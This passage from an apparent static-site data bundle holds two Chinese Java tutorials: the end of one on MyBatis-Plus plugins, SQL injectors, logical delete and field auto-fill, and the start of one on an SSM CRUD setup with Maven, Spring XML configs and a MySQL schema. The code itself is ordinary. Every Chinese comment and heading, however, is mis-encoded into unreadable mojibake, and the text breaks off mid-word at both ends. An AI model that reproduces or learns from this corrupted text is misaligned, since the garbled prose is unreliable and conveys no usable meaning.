.setusername("root")\n        .setpassword("123456");\n    /*ç­ç¥éç½®*/\n    strategyconfig stconfig = new strategyconfig();\n    stconfig.setcapitalmode(true) /* å¨å±å¤§åå½å*/\n        .setdbcolumnunderline(true) /*è¡¨å å­æ®µå æ¯å¦ä½¿ç¨ä¸æ» çº¿å½å*/\n        .setnaming(namingstrategy.underline_to_camel) /* æ°æ® åºè¡¨æ å°å°å®ä½çå½åç­ç¥*/\n        .setinclude("tbl_employee") /*çæçè¡¨*/\n        .settableprefix("tbl_"); // è¡¨åç¼\n    /*ååç­ç¥*/\n    packageconfig pkconfig = new packageconfig();\n    pkconfig.setparent("com.pwddd.mp")\n        .setcontroller("controller")\n        .setentity("beans")\n        .setservice("service");\n    autogenerator ag = new\n        autogenerator().setglobalconfig(config).setdatasource(dsconfig)\n        .setstrategy(stconfig)\n        .setpackageinfo(pkconfig);\n    ag.execute();\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n\n# æä»¶\n\n\n# åé¡µæä»¶\n\n\x3c!-- æä»¶æ³¨å --\x3e\n<property name="plugins">\n    <list>\n        \x3c!-- æ³¨ååé¡µæä»¶ --\x3e\n        <bean class="com.baomidou.mybatisplus.plugins.paginationinterceptor"></bean>\n    </list>\n</property>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# æ§è¡åææä»¶\n\n\x3c!-- æä»¶æ³¨å --\x3e\n<property name="plugins">\n    <list>\n        \x3c!-- æ³¨åæ§è¡åææä»¶ --\x3e\n        <bean class="com.baomidou.mybatisplus.plugins.sqlexplaininterceptor">\n            <property name="stopproceed" value="true"></property>\n        </bean>\n    </list>\n</property>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# ä¹è§éæä»¶\n\n\x3c!-- æä»¶æ³¨å --\x3e\n<property name="plugins">\n    <list>\n        \x3c!-- æ³¨åä¹è§éæä»¶ --\x3e\n        <bean class="com.baomidou.mybatisplus.plugins.optimisticlockerinterceptor">\n        </bean>\n    </list>\n</property>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# æ§è¡åææä»¶\n\n\x3c!-- æä»¶æ³¨å --\x3e\n<property name="plugins">\n    <list>\n        \x3c!-- æ³¨åæ§è½åææä»¶ --\x3e\n        <bean class="com.baomidou.mybatisplus.plugins.performanceinterceptor">\n            <property name="format" value="true"></property>\n            \x3c!-- <property name="maxtime" value="5"></property> --\x3e\n        </bean>\n    </list>\n</property>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# æµè¯ä»£ç \n\npublic class testmp {\n    applicationcontext ctx  = new classpathxmlapplicationcontext("applicationcontext.xml");\n    employeemapper employeemapper = ctx.getbean("employeemapper",employeemapper.class);\n\n    /**\n\t * æµè¯ ä¹è§éæä»¶\n\t */\n\n    @test\n    public void testoptimisticlocker() {\n        //æ´æ°æä½\n        employee employee = new employee();\n        employee.setid(15);\n        employee.setlastname("tomaa");\n        employee.setemail("tomaa@sina.com");\n        employee.setgender("1");\n        employee.setage(22);\n        employee.setversion(3);\n        employeemapper.updatebyid(employee);\n\n    }\n\n    /**\n\t * æµè¯ æ§è½åææä»¶\n\t */\n    @test\n    public void testperformance() {\n        employee employee = new employee();\n        employee.setlastname("çå©äºèå¸");\n        employee.setemail("mly@sina.com");\n        employee.setgender("0");\n        employee.setage(22);\n        employeemapper.insert(employee);\n\n    }\n\n    /**\n\t * æµè¯sqlæ§è¡åææä»¶\n\t */\n    @test\n    public void testsqlexplain() {\n\n        employeemapper.delete(null);  // å¨è¡¨å é¤\n    }\n\n    /**\n\t * æµè¯åé¡µæä»¶\n\t */\n    @test\n    public void testpage() {\n        page<employee> page = new page<>(1,1);\n        list<employee > emps = \n            employeemapper.selectpage(page, null);\n        system.out.println(emps);\n        system.out.println("===============è·ååé¡µç¸å³çä¸äºä¿¡æ¯======================");\n        system.out.println("æ»æ¡æ°:" +page.gettotal());\n        system.out.println("å½åé¡µç : "+  page.getcurrent());\n        system.out.println("æ»é¡µç :" + page.getpages());\n        system.out.println("æ¯é¡µæ¾ç¤ºçæ¡æ°:" + page.getsize());\n        system.out.println("æ¯å¦æä¸ä¸é¡µ: " + page.hasprevious());\n        system.out.println("æ¯å¦æä¸ä¸é¡µ: " + page.hasnext());\n\n        //å°æ¥è¯¢çç»æå°è£å°pageå¯¹è±¡ä¸­\n        page.setrecords(emps);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n\n\n\n# èªå®ä¹å¨å±æä½\n\n\n# autosqlinjector\n\næ ¹æ®mybatisplusçautosqlinjectorå¯ä»¥èªå®ä¹åç§ä½ æ³è¦çsql ,æ³¨å¥å°å¨å±ä¸­ï¼ç¸å½äºèªå®ä¹mybatisplusèªå¨æ³¨å¥çæ¹æ³ã\n\n 1. å¨mapperæ¥å£ä¸­å®ä¹ç¸å³çæ¹æ³\n    \n    public interface employeemapper extends basemapper<employee> {\n        int deleteall();\n    }\n    \n    \n    1\n    2\n    3\n    \n\n 2. æ©å±autosqlinjector.injectæ¹æ³ï¼å®ç°mapperæ¥å£ä¸­æ¹æ³è¦æ³¨å¥çsql\n    \n    public class myinjector extends autosqlinjector {\n        @override\n        public void inject(configuration configuration, mapperbuilderassistant builderassistant, class<?> mapperclass, class<?> modelclass, tableinfo table) {\n            //å°employeemapperä¸­å®ä¹çdeleteallï¼ å¤çæå¯¹åºçmappedstatementå¯¹è±¡ï¼å å¥å°configurationå¯¹è±¡ä¸­ã\n    \n            //æ³¨å¥çsqlè¯­å¥\n            string sql = "delete from " +table.gettablename();\n            //æ³¨å¥çæ¹æ³å   ä¸å®è¦ä¸employeemapperæ¥å£ä¸­çæ¹æ³åä¸è´\n            string method = "deleteall" ;\n    \n            //æé sqlsourceå¯¹è±¡\n            sqlsource sqlsource = languagedriver.createsqlsource(configuration, sql, modelclass);\n    \n            //æé ä¸ä¸ªå é¤çmappedstatement\n            this.adddeletemappedstatement(mapperclass, method, sqlsource);\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    \n\n 3. å¨mpå¨å±ç­ç¥ä¸­ï¼éç½®èªå®ä¹æ³¨å¥å¨\n    \n    <bean id="globalconfiguration" class="com.baomidou.mybatisplus.entity.globalconfiguration">\n        <property name="dbcolumnunderline" value="true" />\n        \x3c!--å¨å±éç½® --\x3e\n        <property name="idtype" value="0" />\n    \n        <property name="tableprefix" value="tbl_" />\n        <property name="sqlinjector" ref="injector" />\n        </bean>\n    \n        <bean class="com.pwddd.mp.mpconfig.myinjector" id="injector"/>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    \n\n\n# é»è¾å é¤\n\nåå é¤ãé»è¾å é¤: å¹¶ä¸ä¼çæ­£çä»æ°æ®åºä¸­å°æ°æ®å é¤æï¼èæ¯å°å½åè¢«å é¤çè¿æ¡æ°æ®ä¸­çä¸ä¸ªé»è¾å é¤å­æ®µç½®ä¸ºå é¤ç¶æã\n\n 1. éç½®é»è¾å é¤bean\n    \n    \x3c!-- é»è¾å é¤ --\x3e\n    \t<bean id="logicsqlinjector" class="com.baomidou.mybatisplus.mapper.logicsqlinjector"></bean>\n    \n    \n    1\n    2\n    \n\n 2. æ³¨å¥é»è¾å é¤å±æ§\n    \n    \x3c!-- æ³¨å¥é»è¾å é¤ --\x3e\n        <property name="sqlinjector" ref="logicsqlinjector" />\n    \n    \n    1\n    2\n    \n\n 3. éç½®é»è¾å é¤å¼\n    \n    \x3c!-- æ³¨å¥é»è¾å é¤å¨å±å¼ --\x3e\n    <property name="logicdeletevalue" value = "-1"></property>\n    <property name="logicnotdeletevalue" value="1"></property>\n    \n    \n    1\n    2\n    3\n    \n\n 4. å¨ pojo çé»è¾å é¤å­æ®µ æ·»å  @tablelogic æ³¨è§£\n    \n    @tablelogic\n    private integer logic_flag;\n    \n    \n    1\n    2\n    \n\n 5. æ§è¡å é¤ï¼ä¼å¨mpèªå¸¦æ¥è¯¢åæ´æ°æ¹æ³çsqlåé¢ï¼è¿½å ãé»è¾å é¤å­æ®µã=ãlogicnotdeletevalue é»è®¤å¼ã\n\n 6. å é¤æ¹æ³: deletebyid()åå¶ä»deleteæ¹æ³, åºå±sqlè°ç¨çæ¯update tbl_xxx set ãé»è¾å é¤å­æ®µã=ãlogicdeletevalue é»è®¤å¼ã\n\n\n# å¬å±å­æ®µèªå¨å¡«å\n\nmetaobject: åå¯¹è±¡ãæ¯mybatisæä¾çä¸ä¸ªç¨äºæ´å æ¹ä¾¿ï¼æ´å ä¼éçè®¿é®å¯¹è±¡çå±æ§, ç»å¯¹è±¡çå±æ§è®¾ç½®å¼çä¸ä¸ªå¯¹è±¡ãè¿ä¼ç¨äºåè£å¯¹è±¡ãæ¯æå¯¹object ãmapãcollectionç­å¯¹è±¡è¿è¡åè£ã\n\n 1. éç½®èªå¨å¡«åbeanï¼å¹¶æ³¨åå±æ§\n    \n    \x3c!-- å¬å±å­æ®µå¡«å å¤çå¨ --\x3e\n    <bean id="mymetaobjecthandler" class="com.atguigu.mp.metaobjecthandler.mymetaobjecthandler"> </bean>\n    \x3c!-- æ³¨å¥å¬å±å­æ®µå¡«åå¤çå¨ --\x3e\n    <property name="metaobjecthandler" ref="mymetaobjecthandler"></property>\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 2. ç¼åç¸å³ç±»\n    \n    /**\n     * èªå®ä¹å¬å±å­æ®µå¡«åå¤çå¨\n     */\n    public class mymetaobjecthandler extends metaobjecthandler {\n    \t\n    \t/**\n    \t * æå¥æä½ èªå¨å¡«å\n    \t */\n    \t@override\n    \tpublic void insertfill(metaobject metaobject) {\n    \t\t//è·åå°éè¦è¢«å¡«åçå­æ®µçå¼\n    \t\tobject fieldvalue = getfieldvalbyname("name", metaobject);\n    \t\tif(fieldvalue == null) {\n    \t\t\tsystem.out.println("*******æå¥æä½ æ»¡è¶³å¡«åæ¡ä»¶*********");\n    \t\t\tsetfieldvalbyname("name", "weiyunhui", metaobject);\n    \t\t}\n    \t\t\n    \t}\n    \t/**\n    \t * ä¿®æ¹æä½ èªå¨å¡«å\n    \t */\n    \t@override\n    \tpublic void updatefill(metaobject metaobject) {\n    \t\tobject fieldvalue = getfieldvalbyname("name", metaobject);\n    \t\tif(fieldvalue == null) {\n    \t\t\tsystem.out.println("*******ä¿®æ¹æä½ æ»¡è¶³å¡«åæ¡ä»¶*********");\n    \t\t\tsetfieldvalbyname("name", "weiyh", metaobject);\n    \t\t}\n    \t}\n    \n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    \n\n 3. èªå¨å¡«åæ¶ï¼å¦ææä»¬è§å®çå­æ®µä¸ºnullï¼åè¿è¡èªå¨å¡«åã\n\n\n# ideaæä»¶\n\nmybaitsxæä»¶ï¼å¯ä»¥æä¾mapperæä»¶åå¯¹åºæ¥å£ä¹é´çå³èåè·³è½¬ã',charsets:{cjk:!0},lastUpdated:"2022/04/03, 12:13:15",lastUpdatedTimestamp:1648987995e3},{title:"SSM",frontmatter:{title:"SSM",date:"2022-02-21T00:00:00.000Z",permalink:"/dev/java/core/ssm",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å¼å","åç«¯","å¾®æå¡æ ¸å¿"],tags:["SSM","Mabatis","Spring","SpringMVC"],readingShow:"top"},regularPath:"/01.%E5%BC%80%E5%8F%91/101.%E5%90%8E%E7%AB%AF/1011.%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%A0%B8%E5%BF%83/04.SSM.html",relativePath:"01.å¼å/101.åç«¯/1011.å¾®æå¡æ ¸å¿/04.SSM.md",key:"v-7af8708c",path:"/dev/java/core/ssm/",headers:[{level:2,title:"ç¯å¢æ­å»º",slug:"ç¯å¢æ­å»º",normalizedTitle:"ç¯å¢æ­å»º",charIndex:10},{level:3,title:"å¼å¥ä¾èµ",slug:"å¼å¥ä¾èµ",normalizedTitle:"å¼å¥ä¾èµ",charIndex:19},{level:3,title:"å¼å¥åç«¯èµæº",slug:"å¼å¥åç«¯èµæº",normalizedTitle:"å¼å¥åç«¯èµæº",charIndex:3288},{level:3,title:"éç½®web.xml",slug:"éç½®web-xml",normalizedTitle:"éç½®web.xml",charIndex:3591},{level:3,title:"éç½®Mybatiséç½®æä»¶",slug:"éç½®mybatiséç½®æä»¶",normalizedTitle:"éç½®mybatiséç½®æä»¶",charIndex:10063},{level:3,title:"åå»ºæ°æ®åºè¡¨",slug:"åå»ºæ°æ®åºè¡¨",normalizedTitle:"åå»ºæ°æ®åºè¡¨",charIndex:10501},{level:3,title:"Mybatiséåå·¥ç¨",slug:"mybatiséåå·¥ç¨",normalizedTitle:"mybatiséåå·¥ç¨",charIndex:12264},{level:3,title:"ä¿®æ¹çæçMapper",slug:"ä¿®æ¹çæçmapper",normalizedTitle:"ä¿®æ¹çæçmapper",charIndex:14790},{level:3,title:"Springæ³¨å¥ æµè¯Daoå±",slug:"springæ³¨å¥-æµè¯daoå±",normalizedTitle:"springæ³¨å¥ æµè¯daoå±",charIndex:16313},{level:2,title:"æ°æ®å¤ç",slug:"æ°æ®å¤ç",normalizedTitle:"æ°æ®å¤ç",charIndex:16993},{level:3,title:"æ¥è¯¢åå·¥åè¡¨",slug:"æ¥è¯¢åå·¥åè¡¨",normalizedTitle:"æ¥è¯¢åå·¥åè¡¨",charIndex:17002},{level:3,title:"æ·»å é¡µé¢æ¾ç¤ºé¨é¨ä¸æåè¡¨",slug:"æ·»å é¡µé¢æ¾ç¤ºé¨é¨ä¸æåè¡¨",normalizedTitle:"æ·»å é¡µé¢æ¾ç¤ºé¨é¨ä¸æåè¡¨",charIndex:29602},{level:3,title:"æ£æµç¨æ·åæ¯å¦å¯ç¨",slug:"æ£æµç¨æ·åæ¯å¦å¯ç¨",normalizedTitle:"æ£æµç¨æ·åæ¯å¦å¯ç¨",charIndex:30722},{level:3,title:"ä¿å­ç¨æ·ä¿¡æ¯",slug:"ä¿å­ç¨æ·ä¿¡æ¯",normalizedTitle:"ä¿å­ç¨æ·ä¿¡æ¯",charIndex:32160},{level:3,title:"æ´æ°åå·¥ä¿¡æ¯",slug:"æ´æ°åå·¥ä¿¡æ¯",normalizedTitle:"æ´æ°åå·¥ä¿¡æ¯",charIndex:40732},{level:3,title:"å é¤åå·¥ä¿¡æ¯",slug:"å é¤åå·¥ä¿¡æ¯",normalizedTitle:"å é¤åå·¥ä¿¡æ¯",charIndex:44520},{level:2,title:"æ»ç»",slug:"æ»ç»",normalizedTitle:"æ»ç»",charIndex:48703}],headersStr:"ç¯å¢æ­å»º å¼å¥ä¾èµ å¼å¥åç«¯èµæº éç½®web.xml éç½®Mybatiséç½®æä»¶ åå»ºæ°æ®åºè¡¨ Mybatiséåå·¥ç¨ ä¿®æ¹çæçMapper Springæ³¨å¥ æµè¯Daoå± æ°æ®å¤ç æ¥è¯¢åå·¥åè¡¨ æ·»å é¡µé¢æ¾ç¤ºé¨é¨ä¸æåè¡¨ æ£æµç¨æ·åæ¯å¦å¯ç¨ ä¿å­ç¨æ·ä¿¡æ¯ æ´æ°åå·¥ä¿¡æ¯ å é¤åå·¥ä¿¡æ¯ æ»ç»",content:'# SSM\n\n\n# ç¯å¢æ­å»º\n\n\n# å¼å¥ä¾èµ\n\nå¼å¥Mavenç¸å³ä¾èµ\n\n<dependencies>\n    <dependency>\n        <groupId>junit</groupId>\n        <artifactId>junit</artifactId>\n        <version>4.11</version>\n        <scope>test</scope>\n    </dependency>\n\n    \x3c!--å¼å¥é¡¹ç®ä¾èµçjarå --\x3e\n    \x3c!-- SpringMVCãSpring --\x3e\n\n    \x3c!--å¼å¥pageHelperåé¡µæä»¶ --\x3e\n    <dependency>\n        <groupId>com.github.pagehelper</groupId>\n        <artifactId>pagehelper</artifactId>\n        <version>5.0.0</version>\n    </dependency>\n\n    \x3c!-- MBG --\x3e\n    <dependency>\n        <groupId>org.mybatis.generator</groupId>\n        <artifactId>mybatis-generator-core</artifactId>\n        <version>1.3.5</version>\n    </dependency>\n\n\n    <dependency>\n        <groupId>org.springframework</groupId>\n        <artifactId>spring-webmvc</artifactId>\n        <version>4.3.7.RELEASE</version>\n    </dependency>\n\n    \x3c!-- è¿åjsonå­ç¬¦ä¸²çæ¯æ --\x3e\n    <dependency>\n        <groupId>com.fasterxml.jackson.core</groupId>\n        <artifactId>jackson-databind</artifactId>\n        <version>2.8.8</version>\n    </dependency>\n\n    \x3c!--JSR303æ°æ®æ ¡éªæ¯æï¼tomcat7åä»¥ä¸çæå¡å¨ï¼\n    tomcat7ä»¥ä¸çæå¡å¨ï¼elè¡¨è¾¾å¼ãé¢å¤ç»æå¡å¨çlibåä¸­æ¿æ¢æ°çæ åçel\n    --\x3e\n    <dependency>\n        <groupId>org.hibernate</groupId>\n        <artifactId>hibernate-validator</artifactId>\n        <version>5.4.1.Final</version>\n    </dependency>\n\n\n    \x3c!-- Spring-Jdbc --\x3e\n    <dependency>\n        <groupId>org.springframework</groupId>\n        <artifactId>spring-jdbc</artifactId>\n        <version>4.3.7.RELEASE</version>\n    </dependency>\n\n    \x3c!--Spring-test --\x3e\n    <dependency>\n        <groupId>org.springframework</groupId>\n        <artifactId>spring-test</artifactId>\n        <version>4.3.7.RELEASE</version>\n    </dependency>\n\n\n    \x3c!-- Springé¢ååé¢ç¼ç¨ --\x3e\n    <dependency>\n        <groupId>org.springframework</groupId>\n        <artifactId>spring-aspects</artifactId>\n        <version>4.3.7.RELEASE</version>\n    </dependency>\n\n    \x3c!--MyBatis --\x3e\n    <dependency>\n        <groupId>org.mybatis</groupId>\n        <artifactId>mybatis</artifactId>\n        <version>3.4.2</version>\n    </dependency>\n\n    \x3c!-- MyBatisæ´åSpringçééå --\x3e\n    <dependency>\n        <groupId>org.mybatis</groupId>\n        <artifactId>mybatis-spring</artifactId>\n        <version>1.3.1</version>\n    </dependency>\n\n    \x3c!-- æ°æ®åºè¿æ¥æ± ãé©±å¨ --\x3e\n    <dependency>\n        <groupId>c3p0</groupId>\n        <artifactId>c3p0</artifactId>\n        <version>0.9.1</version>\n    </dependency>\n\n    <dependency>\n        <groupId>mysql</groupId>\n        <artifactId>mysql-connector-java</artifactId>\n        <version>5.1.41</version>\n    </dependency>\n\n    \x3c!-- ï¼jstlï¼servlet-apiï¼junitï¼ --\x3e\n    <dependency>\n        <groupId>jstl</groupId>\n        <artifactId>jstl</artifactId>\n        <version>1.2</version>\n    </dependency>\n\n    <dependency>\n        <groupId>javax.servlet</groupId>\n        <artifactId>javax.servlet-api</artifactId>\n        <version>3.0.1</version>\n        <scope>provided</scope>\n    </dependency>\n\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n\n\n\n# å¼å¥åç«¯èµæº\n\n<script type="text/javascript"\n\tsrc="${APP_PATH }/static/js/jquery-1.12.4.min.js"><\/script>\n<link\n\thref="${APP_PATH }/static/bootstrap-3.3.7-dist/css/bootstrap.min.css"\n\trel="stylesheet">\n<script\n\tsrc="${APP_PATH }/static/bootstrap-3.3.7-dist/js/bootstrap.min.js"><\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# éç½®web.xml\n\n<!DOCTYPE web-app PUBLIC\n "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"\n "http://java.sun.com/dtd/web-app_2_3.dtd" >\n\n<web-app>\n    \x3c!-- springéç½®æä»¶ å è½½ --\x3e\n    <context-param>\n        <param-name>contextConfigLocation</param-name>\n        <param-value>classpath:applicationContext.xml</param-value>\n    </context-param>\n\n    \x3c!-- ç¼ç æ¦æªå¨ --\x3e\n    <filter>\n        <filter-name>encodingFilter</filter-name>\n        <filter-class>org.springframework.web.filter.CharacterEncodingFilter</filter-class>\n        <init-param>\n            <param-name>encoding</param-name>\n            <param-value>utf-8</param-value>\n        </init-param>\n        <init-param>\n            <param-name>forceRequestEncoding</param-name>\n            <param-value>true</param-value>\n        </init-param>\n        <init-param>\n            <param-name>forceResponseEncoding</param-name>\n            <param-value>true</param-value>\n        </init-param>\n    </filter>\n\n    \x3c!-- resté£æ ¼æ¦æªå¨ --\x3e\n    <filter>\n        <filter-name>hiddenHttpMethodFilter</filter-name>\n        <filter-class>org.springframework.web.filter.HiddenHttpMethodFilter</filter-class>\n    </filter>\n\n    <filter-mapping>\n        <filter-name>encodingFilter</filter-name>\n        <url-pattern>/*</url-pattern>\n    </filter-mapping>\n\n    <filter-mapping>\n        <filter-name>hiddenHttpMethodFilter</filter-name>\n        <url-pattern>/*</url-pattern>\n    </filter-mapping>\n\n    \x3c!-- å è½½Iocå®¹å¨ --\x3e\n    <listener>\n        <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>\n    </listener>\n\n    \x3c!-- éç½®mvcæ¦æªå¨ --\x3e\n    <servlet>\n        <servlet-name>dispatcherServlet</servlet-name>\n        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n        <init-param>\n            <param-name>contextConfigLocation</param-name>\n            <param-value>classpath:spring-mvc.xml</param-value>\n        </init-param>\n        <load-on-startup>1</load-on-startup>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>dispatcherServlet</servlet-name>\n        <url-pattern>/</url-pattern>\n    </servlet-mapping>\n</web-app>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n\n\néç½®SpringMVCéç½®æä»¶\n\n<?xml version="1.0" encoding="UTF-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n       xmlns:context="http://www.springframework.org/schema/context"\n       xmlns:mvc="http://www.springframework.org/schema/mvc"\n       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc.xsd">\n\n    \x3c!-- ä¸éç¨é»è®¤æ¦æªå¨ï¼éç½®åªæ¦æªCOntrollerå --\x3e\n    <context:component-scan base-package="com.pwddd.ssm" use-default-filters="false">\n        <context:include-filter type="annotation" expression="org.springframework.stereotype.Controller"/>\n    </context:component-scan>\n\n    <bean class="org.springframework.web.servlet.view.InternalResourceViewResolver" id="viewResolver">\n        <property name="prefix" value="/WEB-INF/views/" />\n        <property name="suffix" value=".jsp" />\n    </bean>\n\n    \x3c!--  SpirngMvcå¤çä¸äºç äº¤ç»tomcat   --\x3e\n    <mvc:default-servlet-handler default-servlet-name="default"/>\n    <mvc:annotation-driven />\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\néç½®æ°æ®åºè¿æ¥ä¿¡æ¯\n\njdbc.driver=com.mysql.jdbc.Driver\njdbc.url=jdbc:mysql://localhost:3306/ssm_crud\njdbc.username=root\njdbc.password=123456\n\n\n1\n2\n3\n4\n\n\néç½®springéç½®æä»¶\n\n<?xml version="1.0" encoding="UTF-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n       xmlns:context="http://www.springframework.org/schema/context"\n       xmlns:aop="http://www.springframework.org/schema/aop" xmlns:tx="http://www.springframework.org/schema/tx"\n       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd">\n\n    <context:component-scan base-package="com.pwddd.ssm">\n        <context:exclude-filter type="annotation" expression="org.springframework.stereotype.Controller"/>\n    </context:component-scan>\n\n    <context:property-placeholder location="classpath:jdbc.properties" />\n    <bean class="com.mchange.v2.c3p0.ComboPooledDataSource" id="dataSource">\n        <property name="driverClass" value="${jdbc.driver}" />\n        <property name="jdbcUrl" value="${jdbc.url}" />\n        <property name="user" value="${jdbc.username}" />\n        <property name="password" value="${jdbc.password}" />\n    </bean>\n\n    <bean class="org.springframework.jdbc.datasource.DataSourceTransactionManager" id="dataSourceTransactionManager">\n        <property name="dataSource" ref="dataSource" />\n    </bean>\n\n    \x3c!--  mybatisæ´å  --\x3e\n    <bean class="org.mybatis.spring.SqlSessionFactoryBean" id="sqlSessionFactory" >\n        <property name="dataSource" ref="dataSource" />\n        <property name="configLocation" value="classpath:mybatis-config.xml" />\n        <property name="mapperLocations" value="classpath:mapper/*.xml" />\n    </bean>\n\n    <bean class="org.mybatis.spring.mapper.MapperScannerConfigurer" >\n        <property name="basePackage" value="com.pwddd.ssm.dao" />\n    </bean>\n\n    \x3c!--  äºå¡ç¸å³çéç½®  --\x3e\n    <aop:config>\n        <aop:pointcut id="txPoint" expression="execution(* com.pwddd.service..*(..))" />\n        <aop:advisor advice-ref="txAdvice" pointcut-ref="txPoint" />\n    </aop:config>\n\n    <tx:advice id="txAdvice" transaction-manager="dataSourceTransactionManager">\n        <tx:attributes>\n            <tx:method name="*"/>\n            <tx:method name="get*" read-only="true" />\n        </tx:attributes>\n    </tx:advice>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n\n# éç½®Mybatiséç½®æä»¶\n\n<?xml version="1.0" encoding="UTF-8" ?>\n<!DOCTYPE configuration\n        PUBLIC "-//mybatis.org//DTD Config 3.0//EN"\n        "http://mybatis.org/dtd/mybatis-3-config.dtd">\n<configuration>\n    <settings>\n        <setting name="mapUnderscoreToCamelCase" value="true"/>\n    </settings>\n\n    <typeAliases>\n        <package name="com.pwddd.ssm.bean"/>\n    </typeAliases>\n\n</configuration>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# åå»ºæ°æ®åºè¡¨\n\n/*\n Navicat Premium Data Transfer\n\n Source Server         : localhost\n Source Server Type    : MySQL\n Source Server Version : 50728\n Source Host           : localhost:3306\n Source Schema         : ssm_crud\n\n Target Server Type    : MySQL\n Target Server Version : 50728\n File Encoding         : 65001\n\n Date: 24/02/2022 14:48:02\n*/\n\nSET NAMES utf8mb4;\nSET FOREIGN_KEY_CHECKS = 0;\n\n-- ----------------------------\n-- Table structure for tbl_dept\n-- ----------------------------\nDROP TABLE IF EXISTS `tbl_dept`;\nCREATE TABLE `tbl_dept`  (\n  `dept_id` int(11) NOT NULL AUTO_INCREMENT,\n  `dept_name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,\n  PRIMARY KEY (`dept_id`) USING BTREE\n) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;\n\n-- ----------------------------\n-- Table structure for tbl_employee\n-- ----------------------------\nDROP TABLE IF EXISTS `tbl_employee`;\nCREATE TABLE `tbl_employee`  (\n  `emp_id` int(11) NOT NULL AUTO_INCREMENT,\n  `emp_name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,\n  `gender` char(1) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `email` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `d_id` int(11) NOT NULL,\n  PRIMARY KEY (`emp_id`) USING BTREE,\n  INDEX `fk_dept`(`d_id`) USING BTREE,\n  CONSTRAINT `fk_dept` FOREIGN KEY (`d_id`) REFERENCES `tbl_dept` (`dept_id`) ON DELETE RESTRICT ON UPDATE RESTRICT\n) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = 